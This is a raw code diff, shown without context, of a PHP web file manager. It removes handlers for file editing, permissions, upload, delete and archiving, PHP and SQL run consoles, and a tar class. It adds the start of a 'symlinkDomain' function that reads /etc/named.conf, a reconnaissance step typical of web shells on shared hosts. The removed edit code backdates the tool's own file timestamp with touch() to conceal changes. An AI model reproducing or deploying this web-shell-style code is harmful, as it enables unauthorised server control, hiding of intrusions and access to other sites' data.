-	$select = '<select name="'.$res_lng.'_tpl" title="'.__('Template').'" onchange="if (this.value!=-1) document.forms[\'console\'].elements[\''.$res_lng.'\'].value = this.options[selectedIndex].value; else document.forms[\'console\'].elements[\''.$res_lng.'\'].value =\'\';" >'."\n";
-	$select .= '<option value="-1">' . __('Select') . "</option>\n";
-	foreach ($tmpl as $key=>$value){
-		$select.='<option value="'.$value.'" '.((!empty($value)&&($value==$active))?'selected':'').' >'.__($key)."</option>\n";
-	}
-	$select .= "</select>\n";
-	echo $select;
-}
-?>
-		</form>
-	</td>
-</tr>
-</table>
-<?php
-	if (!empty($res)) {
-		$fun='fm_'.$res_lng;
-		echo '<h3>'.strtoupper($res_lng).' '.__('Result').'</h3><pre>'.$fun($res).'</pre>';
-	}
-} elseif (!empty($_REQUEST['edit'])){
-	if(!empty($_REQUEST['save'])) {
-		$fn = $path . $_REQUEST['edit'];
-		$filemtime = filemtime($fn);
-	    if (file_put_contents($fn, $_REQUEST['newcontent'])) $msg .= __('File updated');
-		else $msg .= __('Error occurred');
-		if ($_GET['edit']==basename(__FILE__)) {
-			touch(__FILE__,1415116371);
-		} else {
-			if (!empty($fm_config['restore_time'])) touch($fn,$filemtime);
-		}
-	}
-    $oldcontent = @file_get_contents($path . $_REQUEST['edit']);
-    $editlink = $url_inc . '&edit=' . $_REQUEST['edit'] . '&path=' . $path;
-    $backlink = $url_inc . '&path=' . $path;
-?>
-<table border='0' cellspacing='0' cellpadding='1' width="100%">
-<tr>
-    <th><?=__('File manager').' - '.__('Edit').' - '.$path.$_REQUEST['edit']?></th>
-</tr>
-<tr>
-    <td class="row1">
-        <?=$msg?>
-	</td>
-</tr>
-<tr>
-    <td class="row1">
-        <?=fm_home()?> <a href="<?=$backlink?>"><?=__('Back')?></a>
-	</td>
-</tr>
-<tr>
-    <td class="row1" align="center">
-        <form name="form1" method="post" action="<?=$editlink?>">
-            <textarea name="newcontent" id="newcontent" cols="45" rows="15" style="width:99%" spellcheck="false"><?=htmlspecialchars($oldcontent)?></textarea>
-            <input type="submit" name="save" value="<?=__('Submit')?>">
-            <input type="submit" name="cancel" value="<?=__('Cancel')?>">
-        </form>
-    </td>
-</tr>
-</table>
-<?php
-echo $auth['script'];
-} elseif(!empty($_REQUEST['rights'])){
-	if(!empty($_REQUEST['save'])) {
-	    if(fm_chmod($path . $_REQUEST['rights'], fm_convert_rights($_REQUEST['rights_val']), @$_REQUEST['recursively']))
-		$msg .= (__('File updated')); 
-		else $msg .= (__('Error occurred'));
-	}
-	clearstatcache();
-    $oldrights = fm_rights_string($path . $_REQUEST['rights'], true);
-    $link = $url_inc . '&rights=' . $_REQUEST['rights'] . '&path=' . $path;
-    $backlink = $url_inc . '&path=' . $path;
-?>
-<table class="whole">
-<tr>
-    <th><?=__('File manager').' - '.$path?></th>
-</tr>
-<tr>
-    <td class="row1">
-        <?=$msg?>
-	</td>
-</tr>
-<tr>
-    <td class="row1">
-        <a href="<?=$backlink?>"><?=__('Back')?></a>
-	</td>
-</tr>
-<tr>
-    <td class="row1" align="center">
-        <form name="form1" method="post" action="<?=$link?>">
-           <?=__('Rights').' - '.$_REQUEST['rights']?> <input type="text" name="rights_val" value="<?=$oldrights?>">
-        <?php if (is_dir($path.$_REQUEST['rights'])) { ?>
-            <input type="checkbox" name="recursively" value="1"> <?=__('Recursively')?><br/>
-        <?php } ?>
-            <input type="submit" name="save" value="<?=__('Submit')?>">
-        </form>
-    </td>
-</tr>
-</table>
-<?php
-} elseif (!empty($_REQUEST['rename'])&&$_REQUEST['rename']<>'.') {
-	if(!empty($_REQUEST['save'])) {
-	    rename($path . $_REQUEST['rename'], $path . $_REQUEST['newname']);
-		$msg .= (__('File updated'));
-		$_REQUEST['rename'] = $_REQUEST['newname'];
-	}
-	clearstatcache();
-    $link = $url_inc . '&rename=' . $_REQUEST['rename'] . '&path=' . $path;
-    $backlink = $url_inc . '&path=' . $path;
-
-?>
-<table class="whole">
-<tr>
-    <th><?=__('File manager').' - '.$path?></th>
-</tr>
-<tr>
-    <td class="row1">
-        <?=$msg?>
-	</td>
-</tr>
-<tr>
-    <td class="row1">
-        <a href="<?=$backlink?>"><?=__('Back')?></a>
-	</td>
-</tr>
-<tr>
-    <td class="row1" align="center">
-        <form name="form1" method="post" action="<?=$link?>">
-            <?=__('Rename')?>: <input type="text" name="newname" value="<?=$_REQUEST['rename']?>"><br/>
-            <input type="submit" name="save" value="<?=__('Submit')?>">
-        </form>
-    </td>
-</tr>
-</table>
-<?php
-} else {
-//Let's rock!
-    $msg = '';
-    if(!empty($_FILES['upload'])&&!empty($fm_config['upload_file'])) {
-        if(!empty($_FILES['upload']['name'])){
-            $_FILES['upload']['name'] = str_replace('%', '', $_FILES['upload']['name']);
-            if(!move_uploaded_file($_FILES['upload']['tmp_name'], $path . $_FILES['upload']['name'])){
-                $msg .= __('Error occurred');
-            } else {
-				$msg .= __('Files uploaded').': '.$_FILES['upload']['name'];
-			}
-        }
-    } elseif(!empty($_REQUEST['delete'])&&$_REQUEST['delete']<>'.') {
-        if(!fm_del_files(($path . $_REQUEST['delete']), true)) {
-            $msg .= __('Error occurred');
-        } else {
-			$msg .= __('Deleted').' '.$_REQUEST['delete'];
-		}
-	} elseif(!empty($_REQUEST['mkdir'])&&!empty($fm_config['make_directory'])) {
-        if(!@mkdir($path . $_REQUEST['dirname'],0777)) {
-            $msg .= __('Error occurred');
-        } else {
-			$msg .= __('Created').' '.$_REQUEST['dirname'];
-		}
-    } elseif(!empty($_POST['search_recursive'])) {
-		ini_set('max_execution_time', '0');
-		$search_data =  find_text_in_files($_POST['path'], $_POST['mask'], $_POST['search_recursive']);
-		if(!empty($search_data)) {
-			$msg .= __('Found in files').' ('.count($search_data).'):<br>';
-			foreach ($search_data as $filename) {
-				$msg .= '<a href="'.fm_url(true).'?fm=true&edit='.basename($filename).'&path='.str_replace('/'.basename($filename),'/',$filename).'" title="' . __('Edit') . '">'.basename($filename).'</a>&nbsp; &nbsp;';
-			}
-		} else {
-			$msg .= __('Nothing founded');
-		}	
-	} elseif(!empty($_REQUEST['mkfile'])&&!empty($fm_config['new_file'])) {
-        if(!$fp=@fopen($path . $_REQUEST['filename'],"w")) {
-            $msg .= __('Error occurred');
-        } else {
-			fclose($fp);
-			$msg .= __('Created').' '.$_REQUEST['filename'];
-		}
-    } elseif (isset($_GET['zip'])) {
-		$source = base64_decode($_GET['zip']);
-		$destination = basename($source).'.zip';
-		set_time_limit(0);
-		$phar = new PharData($destination);
-		$phar->buildFromDirectory($source);
-		if (is_file($destination))
-		$msg .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
-		'.&nbsp;'.fm_link('download',$path.$destination,__('Download'),__('Download').' '. $destination)
-		.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="'.__('Delete').' '. $destination.'" >'.__('Delete') . '</a>';
-		else $msg .= __('Error occurred').': '.__('no files');
-	} elseif (isset($_GET['gz'])) {
-		$source = base64_decode($_GET['gz']);
-		$archive = $source.'.tar';
-		$destination = basename($source).'.tar';
-		if (is_file($archive)) unlink($archive);
-		if (is_file($archive.'.gz')) unlink($archive.'.gz');
-		clearstatcache();
-		set_time_limit(0);
-		//die();
-		$phar = new PharData($destination);
-		$phar->buildFromDirectory($source);
-		$phar->compress(Phar::GZ,'.tar.gz');
-		unset($phar);
-		if (is_file($archive)) {
-			if (is_file($archive.'.gz')) {
-				unlink($archive); 
-				$destination .= '.gz';
-			}
-
-			$msg .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
-			'.&nbsp;'.fm_link('download',$path.$destination,__('Download'),__('Download').' '. $destination)
-			.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="'.__('Delete').' '.$destination.'" >'.__('Delete').'</a>';
-		} else $msg .= __('Error occurred').': '.__('no files');
-	} elseif (isset($_GET['decompress'])) {
-		// $source = base64_decode($_GET['decompress']);
-		// $destination = basename($source);
-		// $ext = end(explode(".", $destination));
-		// if ($ext=='zip' OR $ext=='gz') {
-			// $phar = new PharData($source);
-			// $phar->decompress();
-			// $base_file = str_replace('.'.$ext,'',$destination);
-			// $ext = end(explode(".", $base_file));
-			// if ($ext=='tar'){
-				// $phar = new PharData($base_file);
-				// $phar->extractTo(dir($source));
-			// }
-		// } 
-		// $msg .= __('Task').' "'.__('Decompress').' '.$source.'" '.__('done');
-	} elseif (isset($_GET['gzfile'])) {
-		$source = base64_decode($_GET['gzfile']);
-		$archive = $source.'.tar';
-		$destination = basename($source).'.tar';
-		if (is_file($archive)) unlink($archive);
-		if (is_file($archive.'.gz')) unlink($archive.'.gz');
-		set_time_limit(0);
-		//echo $destination;
-		$ext_arr = explode('.',basename($source));
-		if (isset($ext_arr[1])) {
-			unset($ext_arr[0]);
-			$ext=implode('.',$ext_arr);
-		} 
-		$phar = new PharData($destination);
-		$phar->addFile($source);
-		$phar->compress(Phar::GZ,$ext.'.tar.gz');
-		unset($phar);
-		if (is_file($archive)) {
-			if (is_file($archive.'.gz')) {
-				unlink($archive); 
-				$destination .= '.gz';
-			}
-			$msg .= __('Task').' "'.__('Archiving').' '.$destination.'" '.__('done').
-			'.&nbsp;'.fm_link('download',$path.$destination,__('Download'),__('Download').' '. $destination)
-			.'&nbsp;<a href="'.$url_inc.'&delete='.$destination.'&path=' . $path.'" title="'.__('Delete').' '.$destination.'" >'.__('Delete').'</a>';
-		} else $msg .= __('Error occurred').': '.__('no files');
-	}
-?>
-<table class="whole" id="header_table" >
-<tr>
-    <th colspan="2"><?=__('File manager')?><?=(!empty($path)?' - '.$path:'')?></th>
-</tr>
-<?php if(!empty($msg)){ ?>
-<tr>
-	<td colspan="2" class="row2"><?=$msg?></td>
-</tr>
-<?php } ?>
-<tr>
-    <td class="row2">
-		<table>
-			<tr>
-			<td>
-				<?=fm_home()?>
-			</td>
-			<td>
-			<?php if(!empty($fm_config['make_directory'])) { ?>
-				<form method="post" action="<?=$url_inc?>">
-				<input type="hidden" name="path" value="<?=$path?>" />
-				<input type="text" name="dirname" size="15">
-				<input type="submit" name="mkdir" value="<?=__('Make directory')?>">
-				</form>
-			<?php } ?>
-			</td>
-			<td>
-			<?php if(!empty($fm_config['new_file'])) { ?>
-				<form method="post" action="<?=$url_inc?>">
-				<input type="hidden" name="path"     value="<?=$path?>" />
-				<input type="text"   name="filename" size="15">
-				<input type="submit" name="mkfile"   value="<?=__('New file')?>">
-				</form>
-			<?php } ?>
-			</td>
-			<td>
-				<form  method="post" action="<?=$url_inc?>" style="display:inline">
-				<input type="hidden" name="path" value="<?=$path?>" />
-				<input type="text" placeholder="<?=__('Recursive search')?>" name="search_recursive" value="<?=!empty($_POST['search_recursive'])?$_POST['search_recursive']:''?>" size="15">
-				<input type="text" name="mask" placeholder="<?=__('Mask')?>" value="<?=!empty($_POST['mask'])?$_POST['mask']:'*.*'?>" size="5">
-				<input type="submit" name="search" value="<?=__('Search')?>">
-				</form>
-			</td>
-			<td>
-			<?=fm_run_input('php')?>
-			</td>
-			<td>
-			<?=fm_run_input('sql')?>
-			</td>
-			</tr>
-		</table>
-    </td>
-    <td class="row3">
-		<table>
-		<tr>
-		<td>
-		<?php if (!empty($fm_config['upload_file'])) { ?>
-			<form name="form1" method="post" action="<?=$url_inc?>" enctype="multipart/form-data">
-			<input type="hidden" name="path" value="<?=$path?>" />
-			<input type="file" name="upload" id="upload_hidden" style="position: absolute; display: block; overflow: hidden; width: 0; height: 0; border: 0; padding: 0;" onchange="document.getElementById('upload_visible').value = this.value;" />
-			<input type="text" readonly="1" id="upload_visible" placeholder="<?=__('Select the file')?>" style="cursor: pointer;" onclick="document.getElementById('upload_hidden').click();" />
-			<input type="submit" name="test" value="<?=__('Upload')?>" />
-			</form>
-		<?php } ?>
-		</td>
-		<td>
-		<?php if ($auth['authorize']) { ?>
-			<form action="" method="post">&nbsp;&nbsp;&nbsp;
-			<input name="quit" type="hidden" value="1">
-			<?=__('Hello')?>, <?=$auth['login']?>
-			<input type="submit" value="<?=__('Quit')?>">
-			</form>
-		<?php } ?>
-		</td>
-		<td>
-		<?=fm_lang_form($language)?>
-		</td>
-		<tr>
-		</table>
-    </td>
-</tr>
-</table>
-<table class="all" border='0' cellspacing='1' cellpadding='1' id="fm_table" width="100%">
-<thead>
-<tr> 
-    <th style="white-space:nowrap"> <?=__('Filename')?> </th>
-    <th style="white-space:nowrap"> <?=__('Size')?> </th>
-    <th style="white-space:nowrap"> <?=__('Date')?> </th>
-    <th style="white-space:nowrap"> <?=__('Rights')?> </th>
-    <th colspan="4" style="white-space:nowrap"> <?=__('Manage')?> </th>
-</tr>
-</thead>
-<tbody>
-<?php
-$elements = fm_scan_dir($path, '', 'all', true);
-$dirs = array();
-$files = array();
-foreach ($elements as $file){
-    if(@is_dir($path . $file)){
-        $dirs[] = $file;
+function symlinkDomain()
+{
+    $d0mains = @file("/etc/named.conf", false);
+    if (!$d0mains) {
+        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
+        $GLOBALS["need_to_update_header"] = "true";
     } else {
-        $files[] = $file;
-    }
-}
-natsort($dirs); natsort($files);
-$elements = array_merge($dirs, $files);
-
-foreach ($elements as $file){
-    $filename = $path . $file;
-    $filedata = @stat($filename);
-    if(@is_dir($filename)){
-		$filedata[7] = '';
-		if (!empty($fm_config['show_dir_size'])&&!fm_root($file)) $filedata[7] = fm_dir_size($filename);
-        $link = '<a href="'.$url_inc.'&path='.$path.$file.'" title="'.__('Show').' '.$file.'"><span class="folder">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'</a>';
-        $loadlink= (fm_root($file)||$phar_maybe) ? '' : fm_link('zip',$filename,__('Compress').'&nbsp;zip',__('Archiving').' '. $file);
-		$arlink  = (fm_root($file)||$phar_maybe) ? '' : fm_link('gz',$filename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '.$file);
-        $style = 'row2';
-		 if (!fm_root($file)) $alert = 'onClick="if(confirm(\'' . __('Are you sure you want to delete this directory (recursively)?').'\n /'. $file. '\')) document.location.href = \'' . $url_inc . '&delete=' . $file . '&path=' . $path  . '\'"'; else $alert = '';
-    } else {
-		$link = 
-			$fm_config['show_img']&&@getimagesize($filename) 
-			? '<a target="_blank" onclick="var lefto = screen.availWidth/2-320;window.open(\''
-			. fm_img_link($filename)
-			.'\',\'popup\',\'width=640,height=480,left=\' + lefto + \',scrollbars=yes,toolbar=no,location=no,directories=no,status=no\');return false;" href="'.fm_img_link($filename).'"><span class="img">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'</a>'
-			: '<a href="' . $url_inc . '&edit=' . $file . '&path=' . $path. '" title="' . __('Edit') . '"><span class="file">&nbsp;&nbsp;&nbsp;&nbsp;</span> '.$file.'</a>';
-		$e_arr = explode(".", $file);
-		$ext = end($e_arr);
-        $loadlink =  fm_link('download',$filename,__('Download'),__('Download').' '. $file);
-		$arlink = in_array($ext,array('zip','gz','tar')) 
-		? ''
-		: ((fm_root($file)||$phar_maybe) ? '' : fm_link('gzfile',$filename,__('Compress').'&nbsp;.tar.gz',__('Archiving').' '. $file));
-        $style = 'row1';
-		$alert = 'onClick="if(confirm(\''. __('File selected').': \n'. $file. '. \n'.__('Are you sure you want to delete this file?') . '\')) document.location.href = \'' . $url_inc . '&delete=' . $file . '&path=' . $path  . '\'"';
-    }
-    $deletelink = fm_root($file) ? '' : '<a href="#" title="' . __('Delete') . ' '. $file . '" ' . $alert . '>' . __('Delete') . '</a>';
-    $renamelink = fm_root($file) ? '' : '<a href="' . $url_inc . '&rename=' . $file . '&path=' . $path . '" title="' . __('Rename') .' '. $file . '">' . __('Rename') . '</a>';
-    $rightstext = ($file=='.' || $file=='..') ? '' : '<a href="' . $url_inc . '&rights=' . $file . '&path=' . $path . '" title="' . __('Rights') .' '. $file . '">' . @fm_rights_string($filename) . '</a>';
-?>
-<tr class="<?=$style?>"> 
-    <td><?=$link?></td>
-    <td><?=$filedata[7]?></td>
-    <td style="white-space:nowrap"><?=gmdate("Y-m-d H:i:s",$filedata[9])?></td>
-    <td><?=$rightstext?></td>
-    <td><?=$deletelink?></td>
-    <td><?=$renamelink?></td>
-    <td><?=$loadlink?></td>
-    <td><?=$arlink?></td>
-</tr>
-<?php
-    }
-}
-?>
-</tbody>
-</table>
-<div class="row3"><?php
-	$mtime = explode(' ', microtime()); 
-	$totaltime = $mtime[0] + $mtime[1] - $starttime; 
-	echo fm_home().' | ver. '.$fm_version.' | <a href="https://github.com/Den1xxx/Filemanager">Github</a>  | <a href="'.fm_site_url().'">.</a>';
-	if (!empty($fm_config['show_php_ver'])) echo ' | PHP '.phpversion();
-	if (!empty($fm_config['show_php_ini'])) echo ' | '.php_ini_loaded_file();
-	if (!empty($fm_config['show_gt'])) echo ' | '.__('Generation time').': '.round($totaltime,2);
-	if (!empty($fm_config['enable_proxy'])) echo ' | <a href="?proxy=true">proxy</a>';
-	if (!empty($fm_config['show_phpinfo'])) echo ' | <a href="?phpinfo=true">phpinfo</a>';
-	if (!empty($fm_config['show_xls'])&&!empty($link)) echo ' | <a href="javascript: void(0)" onclick="var obj = new table2Excel(); obj.CreateExcelSheet(\'fm_table\',\'export\');" title="'.__('Download').' xls">xls</a>';
-	if (!empty($fm_config['fm_settings'])) echo ' | <a href="?fm_settings=true">'.__('Settings').'</a>';
-	?>
-</div>
-<script type="text/javascript">
-function download_xls(filename, text) {
-	var element = document.createElement('a');
-	element.setAttribute('href', 'data:application/vnd.ms-excel;base64,' + text);
-	element.setAttribute('download', filename);
-	element.style.display = 'none';
-	document.body.appendChild(element);
-	element.click();
-	document.body.removeChild(element);
-}
-
-function base64_encode(m) {
-	for (var k = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/".split(""), c, d, h, e, a, g = "", b = 0, f, l = 0; l < m.length; ++l) {
-		c = m.charCodeAt(l);
-		if (128 > c) d = 1;
-		else
-			for (d = 2; c >= 2 << 5 * d;) ++d;
-		for (h = 0; h < d; ++h) 1 == d ? e = c : (e = h ? 128 : 192, a = d - 2 - 6 * h, 0 <= a && (e += (6 <= a ? 1 : 0) + (5 <= a ? 2 : 0) + (4 <= a ? 4 : 0) + (3 <= a ? 8 : 0) + (2 <= a ? 16 : 0) + (1 <= a ? 32 : 0), a -= 5), 0 > a && (u = 6 * (d - 1 - h), e += c >> u, c -= c >> u << u)), f = b ? f << 6 - b : 0, b += 2, f += e >> b, g += k[f], f = e % (1 << b), 6 == b && (b = 0, g += k[f])
-	}
-	b && (g += k[f << 6 - b]);
-	return g
-}
-
-
-var tableToExcelData = (function() {
-    var uri = 'data:application/vnd.ms-excel;base64,',
-    template = '<html xmlns:o="urn:schemas-microsoft-com:office:office" xmlns:x="urn:schemas-microsoft-com:office:excel" xmlns="http://www.w3.org/TR/REC-html40"><head><!--[if gte mso 9]><xml><x:ExcelWorkbook><x:ExcelWorksheets><x:ExcelWorksheet><x:Name>{worksheet}</x:Name><x:WorksheetOptions><x:DisplayGridlines></x:DisplayGridlines></x:WorksheetOptions></x:ExcelWorksheet></x:ExcelWorksheets></x:ExcelWorkbook></xml><![endif]--><meta http-equiv="content-type" content="text/plain; charset=UTF-8"/></head><body><table>{table}</table></body></html>',
-    format = function(s, c) {
-            return s.replace(/{(\w+)}/g, function(m, p) {
-                return c[p];
-            })
-        }
-    return function(table, name) {
-        if (!table.nodeType) table = document.getElementById(table)
-        var ctx = {
-            worksheet: name || 'Worksheet',
-            table: table.innerHTML.replace(/<span(.*?)\/span> /g,"").replace(/<a\b[^>]*>(.*?)<\/a>/g,"$1")
-        }
-		t = new Date();
-		filename = 'fm_' + t.toISOString() + '.xls'
-		download_xls(filename, base64_encode(format(template, ctx)))
-    }
-})();
-
-var table2Excel = function () {
-
-    var ua = window.navigator.userAgent;
-    var msie = ua.indexOf("MSIE ");
-
-	this.CreateExcelSheet = 
-		function(el, name){
-			if (msie > 0 || !!navigator.userAgent.match(/Trident.*rv\:11\./)) {// If Internet Explorer
-
-				var x = document.getElementById(el).rows;
-
-				var xls = new ActiveXObject("Excel.Application");
-
-				xls.visible = true;
-				xls.Workbooks.Add
-				for (i = 0; i < x.length; i++) {
-					var y = x[i].cells;
-
-					for (j = 0; j < y.length; j++) {
-						xls.Cells(i + 1, j + 1).Value = y[j].innerText;
-					}
-				}
-				xls.Visible = true;
-				xls.UserControl = true;
-				return xls;
-			} else {
-				tableToExcelData(el, name);
-			}
-		}
-}
-</script>
-</body>
-</html>
-
-<?php
-//Ported from ReloadCMS project http://reloadcms.com
-class archiveTar {
-	var $archive_name = '';
-	var $tmp_file = 0;
-	var $file_pos = 0;
-	var $isGzipped = true;
-	var $errors = array();
-	var $files = array();
-	
-	function __construct(){
-		if (!isset($this->errors)) $this->errors = array();
-	}
-	
-	function createArchive($file_list){
-		$result = false;
-		if (file_exists($this->archive_name) && is_file($this->archive_name)) 	$newArchive = false;
-		else $newArchive = true;
-		if ($newArchive){
-			if (!$this->openWrite()) return false;
-		} else {
-			if (filesize($this->archive_name) == 0)	return $this->openWrite();
-			if ($this->isGzipped) {
-				$this->closeTmpFile();
-				if (!rename($this->archive_name, $this->archive_name.'.tmp')){
-					$this->errors[] = __('Cannot rename').' '.$this->archive_name.__(' to ').$this->archive_name.'.tmp';
-					return false;
-				}
-				$tmpArchive = gzopen($this->archive_name.'.tmp', 'rb');
-				if (!$tmpArchive){
-					$this->errors[] = $this->archive_name.'.tmp '.__('is not readable');
-					rename($this->archive_name.'.tmp', $this->archive_name);
-					return false;
-				}
-				if (!$this->openWrite()){
-					rename($this->archive_name.'.tmp', $this->archive_name);
-					return false;
-				}
-				$buffer = gzread($tmpArchive, 512);
-				if (!gzeof($tmpArchive)){
-					do {
-						$binaryData = pack('a512', $buffer);
-						$this->writeBlock($binaryData);
-						$buffer = gzread($tmpArchive, 512);
-					}
-					while (!gzeof($tmpArchive));
-				}
-				gzclose($tmpArchive);
-				unlink($this->archive_name.'.tmp');
-			} else {
-				$this->tmp_file = fopen($this->archive_name, 'r+b');
-				if (!$this->tmp_file)	return false;
-			}
-		}
-		if (isset($file_list) && is_array($file_list)) {
-		if (count($file_list)>0)
-			$result = $this->packFileArray($file_list);
-		} else $this->errors[] = __('No file').__(' to ').__('Archive');
-		if (($result)&&(is_resource($this->tmp_file))){
-			$binaryData = pack('a512', '');
-			$this->writeBlock($binaryData);
-		}
-		$this->closeTmpFile();
-		if ($newArchive && !$result){
-		$this->closeTmpFile();
-		unlink($this->archive_name);
-		}
-		return $result;
-	}
-
-	function restoreArchive($path){
-		$fileName = $this->archive_name;
-		if (!$this->isGzipped){
-			if (file_exists($fileName)){
-				if ($fp = fopen($fileName, 'rb')){
-					$data = fread($fp, 2);
-					fclose($fp);
-					if ($data == '\37\213'){
-						$this->isGzipped = true;
-					}
-				}
-			}
-			elseif ((substr($fileName, -2) == 'gz') OR (substr($fileName, -3) == 'tgz')) $this->isGzipped = true;
-		} 
-		$result = true;
-		if ($this->isGzipped) $this->tmp_file = gzopen($fileName, 'rb');
-		else $this->tmp_file = fopen($fileName, 'rb');
-		if (!$this->tmp_file){
-			$this->errors[] = $fileName.' '.__('is not readable');
-			return false;
-		}
-		$result = $this->unpackFileArray($path);
-			$this->closeTmpFile();
-		return $result;
-	}
-
-	function showErrors	($message = '') {
-		$Errors = $this->errors;
-		if(count($Errors)>0) {
-		if (!empty($message)) $message = ' ('.$message.')';
-			$message = __('Error occurred').$message.': <br/>';
-			foreach ($Errors as $value)
-				$message .= $value.'<br/>';
-			return $message;	
-		} else return '';
-		
-	}
-	
-	function packFileArray($file_array){
-		$result = true;
-		if (!$this->tmp_file){
-			$this->errors[] = __('Invalid file descriptor');
-			return false;
-		}
-		if (!is_array($file_array) || count($file_array)<=0)
-          return true;
-		for ($i = 0; $i<count($file_array); $i++){
-			$filename = $file_array[$i];
-			if ($filename == $this->archive_name)
-				continue;
-			if (strlen($filename)<=0)
-				continue;
-			if (!file_exists($filename)){
-				$this->errors[] = __('No file').' '.$filename;
-				continue;
-			}
-			if (!$this->tmp_file){
-			$this->errors[] = __('Invalid file descriptor');
-			return false;
-			}
-		if (strlen($filename)<=0){
-			$this->errors[] = __('Filename').' '.__('is incorrect');;
-			return false;
-		}
-		$filename = str_replace('\\', '/', $filename);
-		$keep_filename = $this->makeGoodPath($filename);
-		if (is_file($filename)){
-			if (($file = fopen($filename, 'rb')) == 0){
-				$this->errors[] = __('Mode ').__('is incorrect');
-			}
-				if(($this->file_pos == 0)){
-					if(!$this->writeHeader($filename, $keep_filename))
-						return false;
-				}
-				while (($buffer = fread($file, 512)) != ''){
-					$binaryData = pack('a512', $buffer);
-					$this->writeBlock($binaryData);
-				}
-			fclose($file);
-		}	else $this->writeHeader($filename, $keep_filename);
-			if (@is_dir($filename)){
-				if (!($handle = opendir($filename))){
-					$this->errors[] = __('Error').': '.__('Directory ').$filename.__('is not readable');
-					continue;
-				}
-				while (false !== ($dir = readdir($handle))){
-					if ($dir!='.' && $dir!='..'){
-						$file_array_tmp = array();
-						if ($filename != '.')
-							$file_array_tmp[] = $filename.'/'.$dir;
-						else
-							$file_array_tmp[] = $dir;
-
-						$result = $this->packFileArray($file_array_tmp);
-					}
-				}
-				unset($file_array_tmp);
-				unset($dir);
-				unset($handle);
-			}
-		}
-		return $result;
-	}
-
-	function unpackFileArray($path){ 
-		$path = str_replace('\\', '/', $path);
-		if ($path == ''	|| (substr($path, 0, 1) != '/' && substr($path, 0, 3) != '../' && !strpos($path, ':')))	$path = './'.$path;
-		clearstatcache();
-		while (strlen($binaryData = $this->readBlock()) != 0){
-			if (!$this->readHeader($binaryData, $header)) return false;
-			if ($header['filename'] == '') continue;
-			if ($header['typeflag'] == 'L'){			//reading long header
-				$filename = '';
-				$decr = floor($header['size']/512);
-				for ($i = 0; $i < $decr; $i++){
-					$content = $this->readBlock();
-					$filename .= $content;
-				}
-				if (($laspiece = $header['size'] % 512) != 0){
-					$content = $this->readBlock();
-					$filename .= substr($content, 0, $laspiece);
-				}
-				$binaryData = $this->readBlock();
-				if (!$this->readHeader($binaryData, $header)) return false;
-				else $header['filename'] = $filename;
-				return true;
-			}
-			if (($path != './') && ($path != '/')){
-				while (substr($path, -1) == '/') $path = substr($path, 0, strlen($path)-1);
-				if (substr($header['filename'], 0, 1) == '/') $header['filename'] = $path.$header['filename'];
-				else $header['filename'] = $path.'/'.$header['filename'];
-			}
-			
-			if (file_exists($header['filename'])){
-				if ((@is_dir($header['filename'])) && ($header['typeflag'] == '')){
-					$this->errors[] =__('File ').$header['filename'].__(' already exists').__(' as folder');
-					return false;
-				}
-				if ((is_file($header['filename'])) && ($header['typeflag'] == '5')){
-					$this->errors[] =__('Cannot create directory').'. '.__('File ').$header['filename'].__(' already exists');
-					return false;
-				}
-				if (!is_writeable($header['filename'])){
-					$this->errors[] = __('Cannot write to file').'. '.__('File ').$header['filename'].__(' already exists');
-					return false;
-				}
-			} elseif (($this->dirCheck(($header['typeflag'] == '5' ? $header['filename'] : dirname($header['filename'])))) != 1){
-				$this->errors[] = __('Cannot create directory').' '.__(' for ').$header['filename'];
-				return false;
-			}
-
-			if ($header['typeflag'] == '5'){
-				if (!file_exists($header['filename']))		{
-					if (!mkdir($header['filename'], 0777))	{
-						
-						$this->errors[] = __('Cannot create directory').' '.$header['filename'];
-						return false;
-					} 
-				}
-			} else {
-				if (($destination = fopen($header['filename'], 'wb')) == 0) {
-					$this->errors[] = __('Cannot write to file').' '.$header['filename'];
-					return false;
-				} else {
-					$decr = floor($header['size']/512);
-					for ($i = 0; $i < $decr; $i++) {
-						$content = $this->readBlock();
-						fwrite($destination, $content, 512);
-					}
-					if (($header['size'] % 512) != 0) {
-						$content = $this->readBlock();
-						fwrite($destination, $content, ($header['size'] % 512));
-					}
-					fclose($destination);
-					touch($header['filename'], $header['time']);
-				}
-				clearstatcache();
-				if (filesize($header['filename']) != $header['size']) {
-					$this->errors[] = __('Size of file').' '.$header['filename'].' '.__('is incorrect');
-					return false;
-				}
-			}
-			if (($file_dir = dirname($header['filename'])) == $header['filename']) $file_dir = '';
-			if ((substr($header['filename'], 0, 1) == '/') && ($file_dir == '')) $file_dir = '/';
-			$this->dirs[] = $file_dir;
-			$this->files[] = $header['filename'];
-	
-		}
-		return true;
-	}
-
-	function dirCheck($dir){
-		$parent_dir = dirname($dir);
-
-		if ((@is_dir($dir)) or ($dir == ''))
-			return true;
-
-		if (($parent_dir != $dir) and ($parent_dir != '') and (!$this->dirCheck($parent_dir)))
-			return false;
-
-		if (!mkdir($dir, 0777)){
-			$this->errors[] = __('Cannot create directory').' '.$dir;
-			return false;
-		}
-		return true;
-	}
-
-	function readHeader($binaryData, &$header){
-		if (strlen($binaryData)==0){
-			$header['filename'] = '';
-			return true;
-		}
-
-		if (strlen($binaryData) != 512){
-			$header['filename'] = '';
-			$this->__('Invalid block size').': '.strlen($binaryData);
-			return false;
-		}
-
-		$checksum = 0;
-		for ($i = 0; $i < 148; $i++) $checksum+=ord(substr($binaryData, $i, 1));
-		for ($i = 148; $i < 156; $i++) $checksum += ord(' ');
-		for ($i = 156; $i < 512; $i++) $checksum+=ord(substr($binaryData, $i, 1));
-
-		$unpack_data = unpack('a100filename/a8mode/a8user_id/a8group_id/a12size/a12time/a8checksum/a1typeflag/a100link/a6magic/a2version/a32uname/a32gname/a8devmajor/a8devminor', $binaryData);
-
-		$header['checksum'] = OctDec(trim($unpack_data['checksum']));
-		if ($header['checksum'] != $checksum){
-			$header['filename'] = '';
-			if (($checksum == 256) && ($header['checksum'] == 0)) 	return true;
-			$this->errors[] = __('Error checksum for file ').$unpack_data['filename'];
-			return false;
-		}
-
